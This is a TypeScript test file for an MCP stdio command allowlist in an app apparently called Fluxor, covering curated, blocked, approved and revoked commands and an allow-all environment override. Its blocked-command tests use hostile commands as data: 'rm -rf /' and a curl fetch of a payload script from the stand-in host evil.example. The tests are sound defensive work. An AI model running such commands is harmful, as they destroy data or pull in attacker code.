/**
 * mcp-command-policy.test.ts — MCP stdio command allowlist (audit 1.4)
 *
 * Covers the four required scenarios: curated allowed, unapproved blocked,
 * approved-then-allowed, and the FLUXOR_MCP_ALLOW_ALL env escape hatch.
 *
 * settings-store is mocked with an in-memory array standing in for
 * electron-store — electron-store calls electron's app.getPath() internally,
 * which is unavailable outside a running Electron process (see
 * browser-controller.test.ts / dev-server-watcher.test.ts for the same
 * mocking need elsewhere in this suite).
 */
import { beforeEach, afterEach, describe, expect, it, vi } from 'vitest';

interface FakeApprovedEntry {
  command: string;
  args: string[];
  approvedAt: string;
}

const { getStore, setStore, resetStore } = vi.hoisted(() => {
  let approvedMcpCommands: FakeApprovedEntry[] = [];
  return {
    getStore: () => approvedMcpCommands,
    setStore: (value: FakeApprovedEntry[]) => { approvedMcpCommands = value; },
    resetStore: () => { approvedMcpCommands = []; },
  };
});

vi.mock('../storage/settings-store', () => ({
  settingsGet: (key: string) => {
    if (key === 'approvedMcpCommands') return getStore();
    throw new Error(`unexpected settingsGet key in test: ${key}`);
  },
  settingsSet: (key: string, value: unknown) => {
    if (key === 'approvedMcpCommands') {
      setStore(value as FakeApprovedEntry[]);
      return;
    }
    throw new Error(`unexpected settingsSet key in test: ${key}`);
  },
}));

import {
  MCPCommandBlockedError,
  approveMcpCommand,
  assertMcpCommandAllowed,
  isMcpCommandApproved,
  listApprovedMcpCommands,
  matchesCuratedDirectory,
  revokeMcpCommand,
} from './mcp-command-policy';

describe('mcp-command-policy', () => {
  const originalAllowAll = process.env.FLUXOR_MCP_ALLOW_ALL;

  beforeEach(() => {
    resetStore();
    delete process.env.FLUXOR_MCP_ALLOW_ALL;
  });

  afterEach(() => {
    if (originalAllowAll === undefined) {
      delete process.env.FLUXOR_MCP_ALLOW_ALL;
    } else {
      process.env.FLUXOR_MCP_ALLOW_ALL = originalAllowAll;
    }
  });

  describe('curated allowed', () => {
    it('allows an exact curated directory command', () => {
      expect(matchesCuratedDirectory('npx', ['-y', '@modelcontextprotocol/server-filesystem', '.'])).toBe(true);
      expect(() => assertMcpCommandAllowed('npx', ['-y', '@modelcontextprotocol/server-filesystem', '.']))
        .not.toThrow();
    });

    it('allows curated args as a prefix with extra trailing args', () => {
      // Curated 'mcp-fetch' is ['-y', '@modelcontextprotocol/server-fetch'] — an extra
      // trailing flag is tolerated because the curated args are a strict prefix.
      expect(matchesCuratedDirectory('npx', ['-y', '@modelcontextprotocol/server-fetch', '--verbose'])).toBe(true);
    });

    it('rejects a command that only partially matches the curated prefix', () => {
      // Deviates inside the curated prefix window (wrong package name) — not a match.
      expect(matchesCuratedDirectory('npx', ['-y', '@evil/totally-different-package'])).toBe(false);
    });

    it('rejects a different binary even with identical args', () => {
      expect(matchesCuratedDirectory('bash', ['-y', '@modelcontextprotocol/server-fetch'])).toBe(false);
    });
  });

  describe('unapproved blocked', () => {
    it('throws MCPCommandBlockedError carrying the exact command + args', () => {
      expect(() => assertMcpCommandAllowed('rm', ['-rf', '/'])).toThrow(MCPCommandBlockedError);
      try {
        assertMcpCommandAllowed('curl', ['http://evil.example/payload.sh']);
        expect.unreachable('assertMcpCommandAllowed should have thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(MCPCommandBlockedError);
        const blocked = error as MCPCommandBlockedError;
        expect(blocked.command).toBe('curl');
        expect(blocked.args).toEqual(['http://evil.example/payload.sh']);
        expect(blocked.message).toContain('curl http://evil.example/payload.sh');
        expect(blocked.message).toContain('mcp:approveCommand');
      }
    });

    it('is not fooled by an approval recorded for different args', () => {
      approveMcpCommand('my-tool', ['--safe']);
      expect(() => assertMcpCommandAllowed('my-tool', ['--dangerous'])).toThrow(MCPCommandBlockedError);
    });
  });

  describe('approved-then-allowed', () => {
    it('blocks, then allows once approved, and persists the approval', () => {
      expect(() => assertMcpCommandAllowed('my-custom-server', ['--port', '9000'])).toThrow(MCPCommandBlockedError);
      expect(isMcpCommandApproved('my-custom-server', ['--port', '9000'])).toBe(false);

      const afterApprove = approveMcpCommand('my-custom-server', ['--port', '9000']);
      expect(afterApprove).toEqual([
        expect.objectContaining({ command: 'my-custom-server', args: ['--port', '9000'] }),
      ]);
      expect(isMcpCommandApproved('my-custom-server', ['--port', '9000'])).toBe(true);
      expect(listApprovedMcpCommands()).toHaveLength(1);
      expect(() => assertMcpCommandAllowed('my-custom-server', ['--port', '9000'])).not.toThrow();
    });

    it('re-approving the same command+args does not create duplicate entries', () => {
      approveMcpCommand('dup-tool', []);
      approveMcpCommand('dup-tool', []);
      expect(listApprovedMcpCommands()).toHaveLength(1);
    });

    it('revoke removes the approval and the command is blocked again', () => {
      approveMcpCommand('revocable-tool', ['--flag']);
      expect(() => assertMcpCommandAllowed('revocable-tool', ['--flag'])).not.toThrow();

      revokeMcpCommand('revocable-tool', ['--flag']);
      expect(listApprovedMcpCommands()).toHaveLength(0);
      expect(() => assertMcpCommandAllowed('revocable-tool', ['--flag'])).toThrow(MCPCommandBlockedError);
    });
  });

  describe('FLUXOR_MCP_ALLOW_ALL escape hatch', () => {
    it('bypasses the allowlist and logs a loud warning when set to "1"', () => {
      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      process.env.FLUXOR_MCP_ALLOW_ALL = '1';

      expect(() => assertMcpCommandAllowed('anything-goes', ['--whatever'])).not.toThrow();
      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining('FLUXOR_MCP_ALLOW_ALL=1'));
      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining('anything-goes --whatever'));

      warnSpy.mockRestore();
    });

    it('does not bypass the allowlist for any other value', () => {
      process.env.FLUXOR_MCP_ALLOW_ALL = 'true';
      expect(() => assertMcpCommandAllowed('still-blocked', [])).toThrow(MCPCommandBlockedError);
    });
  });
});
